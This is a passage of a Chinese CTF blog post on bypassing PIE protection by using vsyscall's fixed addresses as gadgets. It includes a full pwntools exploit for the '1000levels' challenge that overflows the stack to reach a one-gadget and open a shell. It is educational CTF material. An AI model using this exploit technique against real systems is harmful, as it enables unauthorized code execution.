+<p>这一过程需要消耗一定的性能，对于某些经常被调用的系统函数来说，肯定会造成很大的内存浪费，因此，系统把几个常用的内核调用从内核中映射到用户层空间中，从而引入了vsyscall</p>
+<p>通过命令“cat &#x2F;proc&#x2F;self&#x2F;maps| grep vsyscall”查看，发现vsyscall地址是不变的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192754735.png" srcset="/img/loading.gif" lazyload alt="image-20231215192754735"></p>
+<p>使用gdb把vsyscall从内存中dump下来，拖到IDA中分析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20231215192739784.png" srcset="/img/loading.gif" lazyload alt="image-20231215192739784"></p>
+<p>可以看到里面有三个系统调用，根据对应表得出这三个系统调用分别是__NR_gettimeofday、__NR<em>time、</em>_NR_getcpu</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_gettimeofday 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_time 201</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_getcpu 309</span><br></code></pre></td></tr></table></figure>
+
+<p>这三个都是系统调用，并且也都是通过syscall来实现的，这就意味着我们有了一个可控的syscall</p>
+<p>拿一道CTF真题来做为例子（1000levels）：</p>
+<p>程序具体漏洞这里不再过多的解释，只写涉及到利用vsyscall的步骤</p>
+<p>当我们直接调用vsyscall中的syscall时，会提示段错误，这是因为vsyscall执行时会进行检查，如果不是从函数开头执行的话就会出错</p>
+<p>所以，我们可以直接利用的地址是0xffffffffff600000、0xffffffffff600400、 0xffffffffff600800</p>
+<p>程序开启了PIE，无法从该程序中直接跳转到main函数或者其他地址，因此可以使用vsyscall来充当gadget，使用它的原因也是因为它在内存中的地址是不变的</p>
+<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>io =process(<span class="hljs-string">&#x27;1000levels&#x27;</span>, env=&#123;<span class="hljs-string">&#x27;LD_PRELOAD&#x27;</span>:<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>&#125;)<br><br>libc_base = -<span class="hljs-number">0x456a0</span>                    <span class="hljs-comment">#减去system函数离libc开头的偏移</span><br>one_gadget_base = <span class="hljs-number">0x45526</span>            <span class="hljs-comment">#加上one gadget rce离libc开头的偏移</span><br>vsyscall_gettimeofday = <span class="hljs-number">0xffffffffff600000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">answer</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;Question: &#x27;</span>) <br>    answer = <span class="hljs-built_in">eval</span>(io.recvuntil(<span class="hljs-string">&#x27; = &#x27;</span>)[:-<span class="hljs-number">3</span>])<br>    io.recvuntil(<span class="hljs-string">&#x27;Answer:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(answer))<br>io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)    <br>io.recvuntil(<span class="hljs-string">&#x27;How many levels?&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;-1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Any more?&#x27;</span>)<br><br>io.sendline(<span class="hljs-built_in">str</span>(libc_base+one_gadget_base))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">999</span>):<br>    log.info(i)<br>    answer()<br><br>io.recvuntil(<span class="hljs-string">&#x27;Question: &#x27;</span>)<br><br>io.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(vsyscall_gettimeofday)*<span class="hljs-number">3</span>) <br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>vdso好处是其中的指令可以任意执行，不需要从入口开始，坏处是它的地址是随机化的，如果要利用它，就需要爆破它的地址，在64位下需要爆破的位数很多，但是在32位下需要爆破的字节数就很少。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pie保护</div>
+      <div>http://ak0er.github.io/2024/05/04/pie保护/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ak0er</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/04/SROP/" title="SROP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SROP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/04/%E5%85%B3%E4%BA%8Emalloc-hook%E4%B8%8Efree-hook/" title="关于malloc_hook与free_hook">
+                        <span class="hidden-mobile">关于malloc_hook与free_hook</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
